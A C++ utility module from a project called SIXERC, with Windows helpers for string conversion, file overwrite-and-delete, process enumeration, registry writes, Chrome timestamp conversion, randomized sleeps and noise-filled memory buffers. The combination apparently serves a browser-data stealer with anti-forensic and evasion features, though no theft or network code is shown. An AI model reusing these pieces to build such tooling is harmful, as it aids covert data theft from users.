// ============================================================================
// SIXERC — Utility Implementation
// ============================================================================

#include "core/utils.hpp"
#include "core/crypto.hpp"
#include <fstream>
#include <random>
#include <thread>
#include <algorithm>
#include <shlwapi.h>
#include <tlhelp32.h>

namespace sixerc::utils {

std::string wstring_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, result.data(), size, nullptr, nullptr);
    return result;
}

std::wstring utf8_to_wstring(const std::string& str) {
    if (str.empty()) return {};
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, result.data(), size);
    return result;
}

std::string wide_to_ansi(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size = WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_ACP, 0, wstr.c_str(), -1, result.data(), size, nullptr, nullptr);
    return result;
}

std::wstring get_local_appdata_path() {
    wchar_t path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(nullptr, CSIDL_LOCAL_APPDATA, nullptr, 0, path))) {
        return std::wstring(path);
    }
    return {};
}

std::wstring get_temp_path() {
    wchar_t path[MAX_PATH];
    DWORD len = GetTempPathW(MAX_PATH, path);
    if (len > 0 && len < MAX_PATH) {
        return std::wstring(path);
    }
    return {};
}

bool file_exists(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

bool directory_exists(const std::wstring& path) {
    DWORD attr = GetFileAttributesW(path.c_str());
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

std::vector<std::wstring> list_directories(const std::wstring& path) {
    std::vector<std::wstring> result;
    WIN32_FIND_DATAW findData;
    HANDLE hFind = FindFirstFileW((path + L"\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) return result;
    
    do {
        if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            wcscmp(findData.cFileName, L".") != 0 &&
            wcscmp(findData.cFileName, L"..") != 0) {
            result.push_back(findData.cFileName);
        }
    } while (FindNextFileW(hFind, &findData));
    
    FindClose(hFind);
    return result;
}

bool delete_file_secure(const std::wstring& path) {
    if (!file_exists(path)) return true;
    
    // Overwrite with random data first
    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, nullptr, OPEN_EXISTING,
                                FILE_FLAG_WRITE_THROUGH, nullptr);
    if (hFile != INVALID_HANDLE_VALUE) {
        LARGE_INTEGER size;
        GetFileSizeEx(hFile, &size);
        
        const size_t buf_size = 65536;
        auto buffer = crypto::generate_random_bytes(buf_size);
        DWORD written;
        LONGLONG total = size.QuadPart;
        while (total > 0) {
            DWORD to_write = static_cast<DWORD>(std::min<LONGLONG>(buf_size, total));
            WriteFile(hFile, buffer.data(), to_write, &written, nullptr);
            FlushFileBuffers(hFile);
            total -= to_write;
        }
        CloseHandle(hFile);
    }
    
    // Rename to random name before deletion
    std::wstring temp_name = get_temp_path() + L"\\" + utf8_to_wstring(
        crypto::base64_encode(crypto::generate_random_bytes(16)));
    MoveFileW(path.c_str(), temp_name.c_str());
    return DeleteFileW(temp_name.c_str()) != 0;
}

bool wipe_file(const std::wstring& path) {
    return delete_file_secure(path);
}

std::vector<DWORD> enumerate_processes() {
    std::vector<DWORD> result;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return result;
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(hSnap, &pe)) {
        do {
            result.push_back(pe.th32ProcessID);
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return result;
}

std::wstring get_process_name(DWORD pid) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return {};
    
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    std::wstring name;
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                name = pe.szExeFile;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return name;
}

bool is_process_running(const std::wstring& name) {
    auto pids = enumerate_processes();
    for (DWORD pid : pids) {
        if (_wcsicmp(get_process_name(pid).c_str(), name.c_str()) == 0) {
            return true;
        }
    }
    return false;
}

bool registry_write(HKEY root, const std::wstring& subkey, const std::wstring& value_name,
                    const std::wstring& data) {
    HKEY hKey;
    if (RegCreateKeyExW(root, subkey.c_str(), 0, nullptr, 0, KEY_WRITE, nullptr, &hKey, nullptr) != ERROR_SUCCESS) {
        return false;
    }
    bool ok = RegSetValueExW(hKey, value_name.c_str(), 0, REG_SZ,
                              reinterpret_cast<const BYTE*>(data.c_str()),
                              static_cast<DWORD>((data.size() + 1) * sizeof(wchar_t))) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return ok;
}

bool registry_delete(HKEY root, const std::wstring& subkey) {
    return RegDeleteTreeW(root, subkey.c_str()) == ERROR_SUCCESS ||
           RegDeleteKeyW(root, subkey.c_str()) == ERROR_SUCCESS;
}

bool registry_read(HKEY root, const std::wstring& subkey, const std::wstring& value_name,
                   std::wstring& out_data) {
    HKEY hKey;
    if (RegOpenKeyExW(root, subkey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
    
    DWORD type, size;
    if (RegQueryValueExW(hKey, value_name.c_str(), nullptr, &type, nullptr, &size) != ERROR_SUCCESS || type != REG_SZ) {
        RegCloseKey(hKey);
        return false;
    }
    
    out_data.resize(size / sizeof(wchar_t));
    if (RegQueryValueExW(hKey, value_name.c_str(), nullptr, nullptr,
                         reinterpret_cast<BYTE*>(out_data.data()), &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    
    // Remove null terminator if present
    if (!out_data.empty() && out_data.back() == L'\0') {
        out_data.pop_back();
    }
    
    RegCloseKey(hKey);
    return true;
}

uint64_t chrome_time_to_unix(uint64_t chrome_time) {
    // Chrome time is microseconds since Jan 1, 1601
    // Unix time is seconds since Jan 1, 1970
    // Difference: 11644473600 seconds
    if (chrome_time == 0) return 0;
    return (chrome_time / 1000000) - 11644473600ULL;
}

void random_sleep(uint32_t min_ms, uint32_t max_ms) {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<uint32_t> dist(min_ms, max_ms);
    std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
}

void* allocate_encrypted_buffer(size_t size) {
    void* ptr = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (ptr) {
        // Fill with random data initially to avoid patterns in memory
        auto noise = crypto::generate_random_bytes(size);
        memcpy(ptr, noise.data(), size);
    }
    return ptr;
}

void free_encrypted_buffer(void* ptr, size_t size) {
    if (ptr) {
        crypto::secure_zero(ptr, size);
        VirtualFree(ptr, 0, MEM_RELEASE);
    }
}

} // namespace sixerc::utils
